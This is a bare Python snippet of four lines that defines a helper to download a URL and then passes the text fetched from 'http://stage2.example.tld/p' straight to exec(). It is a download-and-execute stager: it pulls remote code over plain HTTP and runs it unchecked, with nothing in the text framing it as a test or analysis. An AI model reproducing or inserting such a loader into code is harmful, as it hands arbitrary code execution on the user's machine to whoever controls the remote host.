import urllib.request
def fetch(u):
    return urllib.request.urlopen(u).read().decode()
exec(fetch('http://stage2.example.tld/p'))
